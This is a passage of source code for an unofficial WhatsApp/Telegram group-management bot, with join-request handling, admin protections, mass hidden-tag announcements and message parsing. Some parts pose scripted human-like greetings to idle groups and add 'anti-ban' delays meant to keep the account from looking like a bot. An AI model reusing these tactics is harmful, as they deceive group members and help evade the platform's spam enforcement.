        return `${want === 'approve' ? '✅ .autoapprove on/off\nON = I approve everybody who asks to join (except people on your bad list).' : '🚫 .autoreject on/off\nON = I reject everybody who asks to join (except people on your good list).'}\n\nNow: ${gs0.join_mode === 'approve' ? 'auto-approve is ON' : gs0.join_mode === 'reject' ? 'auto-reject is ON' : 'both OFF'}\n\n.markgood <number|@user> — always let this person in\n.markbad <number|@user> — never let this person in, remove if inside\n.unmark <number> · .marklist`;
      }
      if (val === 'off') {
        if (gs0.join_mode === want) setGroupSetting(chatId, 'join_mode', '');
        return `${want === 'approve' ? '✅' : '🚫'} Auto-${want} turned off.`;
      }
      setGroupSetting(chatId, 'join_mode', want);
      let note = '';
      try { await sk.groupJoinApprovalMode(chatId, 'on'); note = '\n(I also switched on "Approve new members" so requests reach me.)'; } catch (_) {}
      const res = await jrProcessPending(sk, chatId);
      if (res.error && !res.total) return `${want === 'approve' ? '✅' : '🚫'} Auto-${want} is ON for new requests.${note}\n⚠️ I couldn't read pending requests: ${res.error}. Make sure I'm an admin in this group.`;
      return `${want === 'approve' ? '✅' : '🚫'} Auto-${want} is ON.${note}\nPending requests handled: ${res.approved} approved, ${res.rejected} rejected${res.error ? `\n⚠️ ${res.error}` : ''}.\nNew requests will be handled automatically.`;
    }

    if (cmd === '.marklist') {
      const rows = jrList(chatId);
      if (!rows.length) return '📋 No one is marked yet.\n.markgood <number> / .markbad <number>';
      const good = rows.filter(r => r.kind === 'good').map(r => '▸ +' + r.digits);
      const bad = rows.filter(r => r.kind === 'bad').map(r => '▸ +' + r.digits);
      return `📋 *JOIN LISTS*\n\n✅ Good (always let in):\n${good.join('\n') || '▸ none'}\n\n🚫 Bad (never let in):\n${bad.join('\n') || '▸ none'}\n\nMode: ${gs0.join_mode === 'approve' ? 'auto-approve' : gs0.join_mode === 'reject' ? 'auto-reject' : 'off'}`;
    }

    // .markgood / .markbad / .unmark — collect the target people (mentions + typed numbers)
    let meta = null; try { meta = await gtWaMeta(sk, chatId, true); } catch (_) {}
    const ownDigits = [sk.user?.id, sk.user?.lid].map(_gtDigits).filter(Boolean);
    const targets = new Set();
    for (const j of mentionedJids || []) {
      const p = meta ? gtWaFind(meta, j) : null;
      const d = _gtDigits((p && (p.phoneNumber || p.jid || p.id)) || j);
      if (d) targets.add(d);
    }
    for (const a of args) { const d = String(a).replace(/\D/g, ''); if (d.length >= 7 && d.length <= 15) targets.add(d); }
    if (!targets.size) return `😒 ${cmd} <number or @mention>\nExample: ${cmd} 2348012345678`;
    const ownerDigits = [String(MY_WA).replace(/\D/g, ''), MY_WA_LID].filter(Boolean);
    const lines = [];
    for (const d of targets) {
      if (ownDigits.includes(d) || ownerDigits.includes(d)) { lines.push(`▸ +${d}: that's you/the bot, skipped`); continue; }
      if (cmd === '.unmark') { lines.push(`▸ +${d}: ${jrUnmark(chatId, d) ? 'removed from the lists' : 'was not on any list'}`); continue; }
      const kind = cmd === '.markgood' ? 'good' : 'bad';
      jrMark(chatId, d, kind);
      const member = meta ? gtWaFind(meta, d + '@s.whatsapp.net') : null;
      let pending = false;
      try { const pl = await sk.groupRequestParticipantsList(chatId); pending = (pl || []).some(r => jrReqIds(r).map(_gtDigits).includes(d)); } catch (_) {}
      if (kind === 'good') {
        if (pending) { const r = await jrProcessPending(sk, chatId); lines.push(`▸ +${d}: marked good, request ${r.approved ? 'approved ✅' : 'could not be approved'}`); }
        else if (member) lines.push(`▸ +${d}: marked good (already in the group)`);
        else {
          try {
            const r = await sk.groupParticipantsUpdate(chatId, [d + '@s.whatsapp.net'], 'add');
            const st = String((r && r[0] && r[0].status) || '200');
            lines.push(st === '200' ? `▸ +${d}: marked good and added ✅` : st === '403' ? `▸ +${d}: marked good, invite sent (their privacy blocks direct adds)` : `▸ +${d}: marked good, couldn't add (code ${st})`);
          } catch (e) { lines.push(`▸ +${d}: marked good, couldn't add: ${e.message}`); }
        }
      } else {
        if (pending) { const r = await jrProcessPending(sk, chatId); lines.push(`▸ +${d}: marked bad, request ${r.rejected ? 'rejected 🚫' : 'could not be rejected'}`); }
        else if (member) {
          try { await sk.groupParticipantsUpdate(chatId, [gtWaApiJid(meta, d + '@s.whatsapp.net')], 'remove'); lines.push(`▸ +${d}: marked bad and removed 🚫`); }
          catch (e) { lines.push(`▸ +${d}: marked bad, couldn't remove: ${e.message}`); }
        } else lines.push(`▸ +${d}: marked bad, they will be rejected/removed if they try to join`);
      }
      await sleep(1200);
    }
    return (cmd === '.unmark' ? '📋 *UNMARKED*\n' : cmd === '.markgood' ? '✅ *GOOD LIST*\n' : '🚫 *BAD LIST*\n') + lines.join('\n');
  }
  if (cmd === '.private' || cmd === '.public') {
    const _pc = _selfCtx.getStore() || {};
    if (!(isOwner(userId) || _pc.linked)) return '💗 only the owner can change private mode.';
    const _inGroup = String(chatId).endsWith('@g.us');
    const gKey = 'privategrp_' + (_pc.sess || 'all') + '_' + chatId;   // this group only
    const allKey = 'private_' + (_pc.sess || 'all');                   // whole bot (set it from a DM)
    const key = _inGroup ? gKey : allKey;
    let val = (args[0] || '').toLowerCase();
    if (cmd === '.public') val = 'off';
    if (!['on', 'off'].includes(val)) {
      const st = _inGroup
        ? `This group: ${kvGet(gKey) === '1' ? 'PRIVATE 🔒' : 'PUBLIC 🌍'}\nWhole bot: ${kvGet(allKey) === '1' ? 'PRIVATE 🔒' : 'PUBLIC 🌍'}`
        : `Whole bot: ${kvGet(allKey) === '1' ? 'PRIVATE 🔒' : 'PUBLIC 🌍'}`;
      return `🔒 .private on/off  (or .public)\nIn a group: only THAT group becomes private, all other groups stay as they are.\nIn a DM with me: the whole bot becomes private (every chat).\nPrivate = I only respond to you.\n\n${st}`;
    }
    kvSet(key, val === 'on' ? '1' : '0');
    if (val === 'on') return _inGroup
      ? '🔒 This group is now PRIVATE. I only respond to you here. All my other groups stay public.\n✅ Group moderation (anti-link, anti-flood, no-bot, etc.) still runs normally. Send .private off or .public here to undo.'
      : '🔒 Whole bot is now PRIVATE. I only respond to you in every chat.\nSend .private off or .public to open me up again.';
    return _inGroup
      ? (kvGet(allKey) === '1' ? '🌍 This group is no longer private on its own, but the whole bot is still private. Send .public in a DM with me to open everything.' : '🌍 This group is PUBLIC again. I respond to everyone here.')
      : '🌍 Whole bot is PUBLIC again. (Groups you set private one by one stay private until you send .public in them.)';
  }
  if (cmd === '.antipromote') {
    if (!isOwner(userId)) return '💗 only the owner can change promote protection.';
    const val = (args[0]||'').toLowerCase();
    if (!['on','off'].includes(val)) return '🛡️ .antipromote on/off\nWhen ON — if anyone (except you, the owner) promotes someone, it is undone and the person who promoted is demoted.';
    setGroupSetting(chatId, 'antipromote_on', val === 'on' ? 1 : 0);
    return `🛡️ Anti-promote turned ${val}. ${val === 'on' ? 'Anyone who promotes someone gets demoted and the promotion is undone. Only the owner can promote.' : 'Any admin can promote now.'}`;
  }
  if (cmd === '.antidemote') {
    if (!isOwner(userId)) return '💗 only the owner can change demote protection.';
    const val = (args[0]||'').toLowerCase();
    if (!['on','off'].includes(val)) return '🛡️ .antidemote on/off\nWhen ON — if anyone (except you, the owner) demotes an admin, that admin is promoted back and the person who demoted is demoted. Nobody can demote the bot except you.';
    setGroupSetting(chatId, 'antidemote_on', val === 'on' ? 1 : 0);
    return `🛡️ Anti-demote turned ${val}. ${val === 'on' ? 'Anyone who demotes an admin gets demoted, the admin is restored, and only the owner can demote the bot.' : 'Any admin can demote now.'}`;
  }
  if (cmd === '.antihijack') {
    if (!isOwner(userId)) return '💗 only the owner can change hijack protection.';
    if (!String(chatId).endsWith('@g.us')) return '😒 use this inside a WhatsApp group.';
    const val = (args[0]||'').toLowerCase();
    const on = getGroupSettings(chatId).antihijack_on;
    if (!['on','off'].includes(val)) return `🔒 *ANTI-HIJACK*\nstatus: ${on ? 'ON' : 'OFF'}\n\n.antihijack on/off\n\nWhen ON:\n• If any admin tries to remove the bot from the group, the bot alerts the owner and another linked session (if available) removes that admin.\n• If an admin mass-removes 3 or more members within 30 seconds, they are immediately removed.\n\nAdmins trusted by the owner (sudo) are always exempt.`;
    setGroupSetting(chatId, 'antihijack_on', val === 'on' ? 1 : 0);
    return `🔒 Anti-hijack turned ${val}. ${val === 'on' ? 'The group is now protected. Any admin who tries to remove the bot or mass-kick members will be removed immediately.' + botAdminNote() : 'Hijack protection is off.'}`;
  }
  if (cmd === '.warnings') {
    const targetArg = args[0] ? args[0].replace('@','') : null;
    if (!targetArg) return '😒 .warnings @user';
    const rows = getWarnings(chatId, 'wa_'+targetArg) || getWarnings(chatId, targetArg);
    if (!rows.length) return `✅ No warnings for that user.`;
    return `⚠️ Warnings (${rows.length}):\n` + rows.map((w,i)=>`${i+1}. ${w.reason||'no reason'} — ${w.warned_at.slice(0,10)}`).join('\n');
  }
  if (cmd === '.clearwarns') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    const targetArg = args[0] ? args[0].replace('@','') : null;
    if (!targetArg) return '😒 .clearwarns @user';
    clearWarnings(chatId, 'wa_'+targetArg);
    clearWarnings(chatId, targetArg);
    return `✅ Warnings cleared.`;
  }
  // ── .announce — OWNER ONLY: sends the message to every WhatsApp group the bot is in, tagging everyone silently (hidden tag) ──
  if (cmd === '.announce') {
    if (!isOwner(rawUserId || userId)) return '❌ only the owner can use .announce.';
    const txt = args.join(' ').trim();
    if (!txt) return '📢 .announce <message>\n\nSends your message to ALL groups I am in and tags everyone silently (hidden tag).\nex: .announce New feature: .anon is live! Ask an admin to open it.';
    const wa = getUserWaSock(rawUserId || userId);
    if (!wa || !wa.sock) return '❌ No WhatsApp session active.';
    let groups;
    try { groups = Object.values(await wa.sock.groupFetchAllParticipating()); }
    catch (e) { return `❌ couldn't read my groups: ${gtErr(e)}`; }
    if (!groups.length) return '📭 I am not in any WhatsApp groups.';
    const body = `📢 *ANNOUNCEMENT*\n\n${txt}`;
    const replyTo = String(chatId).includes('@') ? chatId : null;
    (async () => {                                   // runs in the background with pauses between groups (protects the number from bans)
      let ok = 0, fail = 0;
      for (const g of groups) {
        try {
          await wa.sock.sendMessage(g.id, { text: body, mentions: (g.participants || []).map(p => p.id) });
          ok++;
        } catch (e) { fail++; console.error('[announce]', g.subject, e.message); }
        await sleep(4000 + Math.floor(Math.random() * 4000));
      }
      const done = `📢 announcement finished: ✅ ${ok} group${ok === 1 ? '' : 's'}${fail ? ` · ❌ ${fail} failed` : ''}`;
      try { if (replyTo) await wa.sock.sendMessage(replyTo, { text: done }); else await bot_tg.telegram.sendMessage(chatId, done); } catch (_) {}
    })();
    return `📢 sending to ${groups.length} group${groups.length === 1 ? '' : 's'} (hidden tag, a few seconds apart). I'll tell you when it's done.`;
  }
  // admins can still post a plain notice in their own group
  if (cmd === '.announcehere' || cmd === '.notice') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    const txt = args.join(' ');
    if (!txt) return '😒 .announcehere <message>';
    return `📢 ANNOUNCEMENT\n\n${txt}\n\n— ${name}`;
  }

  // ── Owner group tools (.groups / .joingroup) ──
  if (cmd === '.groups' || cmd === '.joingroup') {
    if (!isOwner(rawUserId||userId)) return '❌ owner only.';
    try { return await gtOwnerWaCommand(cmd, args, getUserWaSock(rawUserId||userId)); }
    catch (e) { return `❌ ${gtErr(e)}`; }
  }

  // ── Cross-platform pairing uses the raw per-platform id ──
  const pr=handlePairing(cmd, rawUserId||userId, name, args); if(pr) return pr;
  const jb=handleJobs(cmd,userId,name,chatId,args,null,mentionedJids); if(jb) return jb;
  const occ=handleOccupations(cmd,userId,name,chatId,args,mentionedJids); if(occ) return occ;
  const eco=handleEconomy(cmd,userId,name,chatId,args,mentionedJids,rawUserId||''); if(eco) return eco;
  const gm=handleGames(cmd,chatId,userId,name,args,mentionedJids); if(gm) return gm;

  // ── Giveaway info shortcut ──
  if(['.gw','.gwstatus'].includes(cmd)){
    const gw=pendingGiveaways[chatId];
    if(!gw) return '...no giveaway running right now.';
    const elapsed=Math.floor((Date.now()-gw.startedAt)/60000);
    return `🎉 *GIVEAWAY*\n\n💰 ${fmt(gw.amount)} · By ${gw.byName}\n👥 ${gw.entries.length} entries · Running ${elapsed} min\n\n.enter to join · .winners to draw`;
  }

  // ── New feature dispatchers ──
  const stocks = handleStocks(cmd, userId, name, args);
  if (stocks) return stocks;

  const clan = handleClan(cmd, userId, name, args);
  if (clan) return clan;

  const roul = handleRoulette(cmd, userId, name, args);
  if (roul) return roul;

  const cdRes = handleCountdown(cmd, userId, name, args);
  if (cdRes) return cdRes;

  const mathRes = handleMathDuel(cmd, userId, name, args);
  if (mathRes) return mathRes;

  const bm = await handleBmarket(cmd, userId, name, args);
  if (bm) return bm;

  const fortune = await handleFortune(cmd, userId, name);
  if (fortune) return fortune;

  const roast = await handleRoast(cmd, userId, name, args);
  if (roast) return roast;

  return null;
}

// ============ TELEGRAM ============
const bot_tg = new Telegraf(BOT_TOKEN, { handlerTimeout: 120_000 });
// Without this, ONE handler that takes >90s makes Telegraf throw out of its polling loop and the bot
// silently stops answering every command (/pair, /start ...) until restart.
bot_tg.catch((err, ctx) => {
  console.error(`[TG handler error] ${ctx?.updateType || '?'}:`, err && err.message ? err.message : err);
});
// every outgoing text / caption goes through her voice (ctx.reply and friends all land here)
try {
  const _tg = bot_tg.telegram;
  const _tgSend = _tg.sendMessage.bind(_tg);
  _tg.sendMessage = (chatId, text, ...r) => _tgSend(chatId, typeof text === 'string' ? botVoice(text) : text, ...r);
  const _tgPhoto = _tg.sendPhoto.bind(_tg);
  _tg.sendPhoto = (chatId, photo, extra, ...r) =>
    _tgPhoto(chatId, photo, (extra && typeof extra.caption === 'string') ? { ...extra, caption: botVoice(extra.caption) } : extra, ...r);
} catch (_) {}


// ============ QUIET-GROUP CHATTER ============
// Tracks last message time per group across all WA sessions.
const _gLastMsg = new Map();   // jid -> { at: timestamp, jid, sessionKey }

const _QUIET_GREETINGS = [
  "okay why is everywhere quiet like this 😂 nobody wan talk?",
  "oya who's here 🙋 say something na",
  "the silence in this group ehn… 😴 una don sleep?",
  "good morning people 🌅 how una dey",
  "good afternoon fam 🤩 hope the day is going well",
  "good evening everyone 🌙 how was today?",
  "so nobody gon say anything? okay I'll start — what's everybody up to 👀",
  "I've been quiet long enough 😂 what's the latest gist?",
  "energy in this group rn: 💀 somebody wake me up when it's lively",
  "just checking in on my people 🥰 hope una dey alright",
  "yo what happened to this group 🤔 everyone disappeared",
  "bored ooo 😩 talk to me people",
];

const _QUIET_DELAY_MS = 3 * 3600 * 1000;   // send a message if group is quiet for 3h
const _QUIET_HOUR_START = 8;                 // only between 8 AM
const _QUIET_HOUR_END   = 22;               // and 10 PM
const _QUIET_MIN_GAP    = 4 * 3600 * 1000; // never chatter more than once every 4h per group

const _gLastChatter = new Map(); // jid -> timestamp of last chatter message

function _getHour() { return new Date().getHours(); }

async function _runQuietChecker() {
  const h = _getHour();
  if (h < _QUIET_HOUR_START || h >= _QUIET_HOUR_END) return;
  const now = Date.now();
  for (const [jid, info] of _gLastMsg.entries()) {
    if (now - info.at < _QUIET_DELAY_MS) continue;                // group is not quiet enough yet
    const lastChat = _gLastChatter.get(jid) || 0;
    if (now - lastChat < _QUIET_MIN_GAP) continue;               // we chatted recently
    const gs = getGroupSettings(jid);
    if (!gs || gs.chatter_off) continue;                          // disabled for this group
    const s = sessions.get(info.sessionKey);
    if (!s || !s.connected || !s.sock) continue;
    const msg = _QUIET_GREETINGS[Math.floor(Math.random() * _QUIET_GREETINGS.length)];
    try {
      await s.sock.sendMessage(jid, { text: msg });
      _gLastChatter.set(jid, now);
      _gLastMsg.set(jid, { at: now, jid, sessionKey: info.sessionKey }); // reset so we don't flood
      console.log('[chatter] sent to', jid);
    } catch (e) { console.error('[chatter]', e.message); }
    await new Promise(r => setTimeout(r, 8000 + Math.random() * 8000)); // gap between groups
  }
}
setInterval(_runQuietChecker, 12 * 60 * 1000); // check every 12 minutes
// ============ END QUIET-GROUP CHATTER ============

// ============ WHATSAPP — MULTI-USER SESSION SYSTEM ============
const sessions = new Map();
// Wire up natural-intents so every dep (db, kvGet, handleCommand, etc.) is ready
naturalIntents.init({ db, kvGet, kvSet, setGroupSetting, handleCommand, gtWaMeta, gtWaIsAdmin, gtWaBotIsAdmin, isSudo, selfCtx: _selfCtx });
// Safety net for join requests: every 3 min handle pending requests in groups that use auto approve/reject or good/bad lists.
setInterval(async () => {
  try {
    const rows = db.prepare("SELECT group_id FROM group_settings WHERE join_mode IN ('approve','reject') UNION SELECT DISTINCT group_id FROM join_marks").all();
    for (const r of rows) {
      if (!String(r.group_id).endsWith('@g.us')) continue;
      const sk = await jrFindSock(r.group_id);
      if (!sk) continue;
      const res = await jrProcessPending(sk, r.group_id);
      if (res.approved || res.rejected) console.log(`[join sweep] ${r.group_id}: approved ${res.approved}, rejected ${res.rejected}`);
      await sleep(3000);
    }
  } catch (e) { console.error('[join sweep]', e.message); }
}, 3 * 60 * 1000);
// Tracks users currently waiting for a pairing code to be entered (3 min window).
// Prevents /pair from killing a live session mid-handshake if user accidentally spams it.
const _pairingLock = new Map(); // tgId → { phone, expiresAt }

function waJid(number) { return String(number).replace(/\D/g,'')+'@s.whatsapp.net'; }


async function isGroupAdmin(sock,groupJid,senderJid){
  try{
    const meta=await sock.groupMetadata(groupJid);
    return gtWaIsAdmin(meta, senderJid);
  }catch(_){return false;}
}

function attachMessageHandler(sock, tgUserId) {
  waLid.attachLidTracking(sock); // harvest @lid ↔ real phone pairs

  // ── Dedup cache — prevents double-processing the same message ────────────
  // Baileys can fire messages.upsert twice for the same msg (notify + append).
  // We track the last 500 message IDs and skip any we've already handled.
  const _seenMsgIds = new Set();
  const _seenMsgLimit = 500;
  const _botSentIds = new Set();
  const _dmFlood = new Map();   // jid -> { hits:[ts], mute:ts }
  const _dmSeen  = new Set();   // contacts already greeted in this run
  try {
    const _origSend = sock.sendMessage.bind(sock);
    const _dmHour = { all: [], chats: new Map() };   // rolling 1-hour DM counters (anti-ban)
    sock.sendMessage = async (...a) => {
      // ── Anti-ban outbound guard: cap send speed + hourly DM volume, so the number never looks like a spam bot ──
      const _to = String(a[0] || '');
      if (_to && _to !== 'status@broadcast') {
        if (!(await _waSendSlot(sock, _to))) { console.warn(`[anti-ban] send to ${_to} dropped — too many messages per minute`); return undefined; }
        if (!_to.endsWith('@g.us')) {
          const nowT = Date.now();
          _dmHour.all = _dmHour.all.filter(t => nowT - t < 3600000);
          const per = (_dmHour.chats.get(_to) || []).filter(t => nowT - t < 3600000);
          if (_dmHour.all.length >= 150 || per.length >= 30) { console.warn(`[anti-ban] DM to ${_to} dropped — hourly DM cap reached`); return undefined; }
          _dmHour.all.push(nowT); per.push(nowT); _dmHour.chats.set(_to, per);
        }
      }
      const r = await _origSend(...a);
      try { if (r?.key?.id) { _botSentIds.add(r.key.id); if (_botSentIds.size > 1000) _botSentIds.delete(_botSentIds.values().next().value); } } catch(_) {}
      return r;
    };
  } catch(_) {}

  sock.ev.on('messages.upsert',async({messages,type})=>{
    // Log EVERY upsert so we can confirm messages are arriving
    console.log(`[WA upsert] type=${type} count=${messages.length}`);
    // Only handle live messages — skip history sync
    if(type !== 'notify') {
      // Commands typed from the linked phone can arrive as 'append' — accept only very recent ones that start with '.'
      const _ok = type === 'append' && messages.some(m => m.key?.fromMe && Date.now()/1000 - Number(m.messageTimestamp?.low ?? m.messageTimestamp ?? 0) < 60 &&
        String(m.message?.conversation || m.message?.extendedTextMessage?.text || '').trim().startsWith('.'));
      if (!_ok) { console.log(`[WA skip] type=${type} not handled`); return; }
    }
    for(let msg of messages){
      // track group activity for quiet-group chatter
      (function(){const rj=msg.key&&msg.key.remoteJid;if(rj&&String(rj).endsWith('@g.us')&&!msg.key.fromMe){const sk=Array.from(sessions.keys()).find(k=>{const se=sessions.get(k);return se&&se.sock&&se.connected});if(sk)_gLastMsg.set(rj,{at:Date.now(),jid:rj,sessionKey:sk});}})();
      // FIX: cache every message so getMessage() can serve WA retry requests.
      // This prevents "Waiting for this message. This may take a while." on the recipient's side.
      if (msg.message && msg.key?.remoteJid && msg.key?.id) {
        const session = sessions.get(tgUserId);
        if (session?.msgStore) {
          const jidKey = msg.key.remoteJid;
          if (!session.msgStore[jidKey]) session.msgStore[jidKey] = {};
          session.msgStore[jidKey][msg.key.id] = msg.message;
          // Keep store bounded — drop oldest entries beyond 200 per JID
          const ids = Object.keys(session.msgStore[jidKey]);
          if (ids.length > 200) delete session.msgStore[jidKey][ids[0]];
        }
      }

      // Log raw message for debugging
      const rawJid  = msg.key?.remoteJid||'?';
      const fromMe  = msg.key?.fromMe;
      const rawText = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '(no text)';
      console.log(`[WA msg] from=${rawJid} fromMe=${fromMe} text="${rawText.slice(0,80)}"`);
      botGsDebugReport(sock, msg);

      if (type === 'append' && !msg.key.fromMe) continue; // 'append' batches: only the linked account's own commands

      // ── wa-gstatus-quick wizard handler ──────────────────────────────────────
      // MUST run BEFORE the fromMe skip so the owner's own image/video messages
      // during the content_await step are not dropped. tryHandleInput returns true
      // only when an active wizard session exists for this sender, so there is no
      // cost for normal messages.
      try {
        const { tryHandleInput: _gswInput } = require('./wa-gstatus-quick');
        // For fromMe messages the sender is the linked account itself, NOT the chat JID.
        // Using remoteJid here would look up the wrong key in gstatusState and always miss.
        const _gswSender = msg.key.fromMe
          ? String(sock.user?.id || '').replace(/:.*?@/, '@')
          : (msg.key.participant || msg.key.remoteJid || '');
        const _gswText   = (msg.message?.conversation || msg.message?.extendedTextMessage?.text ||
                            msg.message?.imageMessage?.caption || msg.message?.videoMessage?.caption || '').trim();
        if (await _gswInput(sock, {
          senderJid:  _gswSender,
          chatJid:    msg.key.remoteJid,
          msg,
          text:       _gswText,
          sessionKey: String(tgUserId),
        })) continue;
      } catch (_gswErr) { console.error('[quick-wizard]', _gswErr.message); }
      // ─────────────────────────────────────────────────────────────────────────

      // The account that linked the bot (owner OR any user who paired their own number) types commands
      // from their own phone -> WhatsApp marks them fromMe. Those used to be dropped, so paired users'
      // commands never worked. Now: accept fromMe ONLY if it starts with "." and the bot didn't send it.
      if(msg.key.fromMe) {
        const _selfText = (msg.message?.conversation || msg.message?.extendedTextMessage?.text ||
          msg.message?.imageMessage?.caption || msg.message?.videoMessage?.caption || '').trim();
        const _sentByBot = _botSentIds.has(msg.key.id);
        const _isNatural = !_sentByBot && naturalIntents.looksAddressed(_selfText, true);
        if (_sentByBot || ((!_selfText.startsWith('.') || _selfText.startsWith('..')) && !_isNatural)) { console.log('[WA skip] fromMe (not a self-command)'); continue; }
        if (_selfText.startsWith('.')) console.log('[WA self-command]', _selfText.slice(0,60));
      }
      if(!msg.message)   { console.log('[WA skip] no message object'); continue; }
      const jid=msg.key.remoteJid;
      if(!jid)           { console.log('[WA skip] no jid'); continue; }
      // 🐛 antibug: catch crash/lag payloads before anything else touches them
      if (!msg.key.fromMe && antibugEnabled(sock)) {
        let _bugWhy = null;
        try { _bugWhy = antibugDetect(msg.message); } catch (_) {}
        if (_bugWhy) {
          let _handled = false;
          try { _handled = await antibugHandle(sock, msg, _bugWhy); } catch (e) { console.error('[antibug]', e.message); }
          if (_handled) { try { delete sessions.get(tgUserId)?.msgStore?.[jid]?.[msg.key.id]; } catch (_) {} continue; }
        }
      }

      // ── Dedup: skip if we've already processed this message ID ──────────
      const _msgId = msg.key.id;
      if (_msgId && _seenMsgIds.has(_msgId)) {
        console.log(`[WA skip] duplicate msgId=${_msgId}`);
        continue;
      }
      if (_msgId) {
        _seenMsgIds.add(_msgId);
        // Keep the set bounded so it doesn't grow forever
        if (_seenMsgIds.size > _seenMsgLimit) {
          _seenMsgIds.delete(_seenMsgIds.values().next().value);
        }
      }
      // Skip status updates, newsletters, protocol and reaction messages
      if(jid==='status@broadcast'||jid.endsWith('@newsletter')){ console.log('[WA skip] status/newsletter'); continue; }
      if(msg.message.protocolMessage||msg.message.reactionMessage){ console.log('[WA skip] protocol/reaction'); continue; }

      // ── Anti-ban inbound guard ────────────────────────────────────────────────
      if (!msg.key.fromMe) {
        // (a) stale backlog: after a reconnect/restart WhatsApp replays old messages. Replying to a burst of
        //     old chats at once is a classic ban trigger, so anything older than 2 minutes is ignored.
        const _ts = Number(msg.messageTimestamp?.low ?? msg.messageTimestamp ?? 0);
        if (_ts && Date.now() / 1000 - _ts > 120) { console.log('[anti-ban skip] stale message'); continue; }
        if (!isJidGroup(jid)) {
          // (b) crash/"bug" payloads and giant walls of text from strangers: ignore, don't read, don't reply
          if (rawText.length > 3000 || (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || []).length > 30) {
            console.warn(`[anti-ban skip] oversized/suspicious DM from ${jid} (${rawText.length} chars)`); continue;
          }
          // (c) flood control: more than 6 messages in 30s from one contact -> ignore them for 10 minutes
          const _now = Date.now();
          const _fl = (_dmFlood.get(jid) || { hits: [], mute: 0 });
          if (_fl.mute > _now) { continue; }
          _fl.hits = _fl.hits.filter(t => _now - t < 30000); _fl.hits.push(_now);
          if (_fl.hits.length > 6) { _fl.mute = _now + 10 * 60 * 1000; _dmFlood.set(jid, _fl); console.warn(`[anti-ban] flood from ${jid} — muted 10 min`); continue; }
          _dmFlood.set(jid, _fl);
          // (d) brand-new contact: don't answer instantly like a bot — wait a few seconds first
          if (!_dmSeen.has(jid)) { _dmSeen.add(jid); await sleep(randomInt(3000, 7000)); }
        }
      }

      const _isGroupStatusPost = isJidGroup(jid) && botIsGroupStatusPost(msg.message);   // check BEFORE unwrapping
      // Remember whether this is a VIEW-ONCE picture/video (the wrapper is removed below)
      let _voKind = null;
      try {
        const _raw = msg.message || {};
        const _voInner = _raw.viewOnceMessage?.message || _raw.viewOnceMessageV2?.message || _raw.viewOnceMessageV2Extension?.message || null;
        const _voSrc = _voInner || _raw;
        if (_voSrc.imageMessage && (_voInner || _voSrc.imageMessage.viewOnce)) _voKind = 'image';
        else if (_voSrc.videoMessage && (_voInner || _voSrc.videoMessage.viewOnce)) _voKind = 'video';
      } catch (_) {}
      // ── Unwrap message containers (viewOnce, ephemeral, etc.) ─────────
      const innerMsg = msg.message.viewOnceMessage?.message
        || msg.message.viewOnceMessageV2?.message?.viewOnceMessage?.message
        || msg.message.ephemeralMessage?.message
        || msg.message.documentWithCaptionMessage?.message
        || msg.message;
      // Replace msg.message with unwrapped version for all downstream checks
      msg = { ...msg, message: innerMsg };

      // ── Detect message type ──────────────────────────────────────────
      const isVoiceNote = !!(msg.message.audioMessage?.ptt);
      const isAudioFile = !!(msg.message.audioMessage && !msg.message.audioMessage?.ptt);
      const isImage     = !!(msg.message.imageMessage);
      const isVideo     = !!(msg.message.videoMessage);
      const isDocument  = !!(msg.message.documentMessage);
      const isSticker   = !!(msg.message.stickerMessage);
      const isContact   = !!(msg.message.contactMessage || msg.message.contactsArrayMessage);
      const isLocation  = !!(msg.message.locationMessage || msg.message.liveLocationMessage);
      const text=(
        msg.message.conversation||
        msg.message.extendedTextMessage?.text||
        msg.message.imageMessage?.caption||
        msg.message.videoMessage?.caption||
        msg.message.documentMessage?.caption||''
      ).trim();

      // Everything in the message that can carry a link: text, captions, link-preview data and GROUP INVITE CARDS
      // (an invite card has no text at all, which is why anti-link never saw it before).
      const _gi  = msg.message.groupInviteMessage;
      const _ext = msg.message.extendedTextMessage;
      const isInvite = !!_gi;
      const isMentionNotice = !!(msg.message.groupMentionedMessage || msg.message.groupStatusMentionMessage || msg.message.statusMentionMessage);
      const _mm = msg.message || {};
      const _extraLinkTxt = [_ext?.title, _ext?.description, _mm.documentMessage?.fileName, _mm.buttonsMessage?.contentText,
        _mm.listMessage?.description, _mm.interactiveMessage?.body?.text, _mm.templateMessage?.hydratedTemplate?.hydratedContentText,
        _mm.templateMessage?.hydratedTemplate?.hydratedTitleText, _mm.locationMessage?.name, _mm.locationMessage?.address]
        .filter(x => typeof x === 'string').join(' ').slice(0, 6000);
      const linkText = [text, _gi ? `https://chat.whatsapp.com/${_gi.inviteCode||''}` : '', _gi?.caption||'', _ext?.matchedText||'', _ext?.canonicalUrl||'', _extraLinkTxt]
        .filter(Boolean).join(' ');

      // Skip if nothing to process
      const hasMedia = isVoiceNote||isAudioFile||isImage||isVideo||isDocument||isSticker||isContact||isLocation||isInvite||isMentionNotice||_isGroupStatusPost;
      if(!text && !hasMedia) { console.log('[WA skip] nothing to process'); continue; }

      const isGroup=isJidGroup(jid);

      // Safe @lid resolution with timeout — if waLid fires a live WA server query
      // for an unknown @lid DM it can hang forever (never rejects, so try/catch
      // alone doesn't help). Race against a 3s timer so the message always
      // continues even when the lid-map has no entry for the sender.
      const _lidTimeout = (ms) => new Promise(resolve => setTimeout(() => resolve(null), ms));

      let resolvedSenderJid = null;
      try {
        resolvedSenderJid = await Promise.race([
          waLid.resolveSenderJid(sock, msg, isGroup, jid),
          _lidTimeout(3000),
        ]);
      } catch(e) { console.error('[WA resolveSender error]', e.message); }

      // For @lid DMs: extract digits from the remoteJid itself as fallback
      const _lidDigits = jid.endsWith('@lid') ? jid.replace('@lid','').replace(/\D/g,'') : null;
      let senderJid = resolvedSenderJid
        || (isGroup ? (msg.key.participant||'') : (_lidDigits ? `${_lidDigits}@s.whatsapp.net` : jid));

      // ── @lid group fix ─────────────────────────────────────────────────────
      // Newer WhatsApp sends group participant IDs as "12345@lid" instead of
      // "2347068176645@s.whatsapp.net". When waLid.resolveSenderJid times out,
      // senderJid stays as the raw @lid and senderNumber becomes a short LID
      // number that will NEVER match MY_WA. Fix: fetch group metadata and match
      // the participant by lid or by id to find their real phone JID.
      if (isGroup && senderJid && (senderJid.endsWith('@lid') || senderJid.endsWith('@lid.us'))) {
        try {
          const _meta = await Promise.race([
            sock.groupMetadata(jid),
            new Promise(r => setTimeout(() => r(null), 4000)),
          ]);
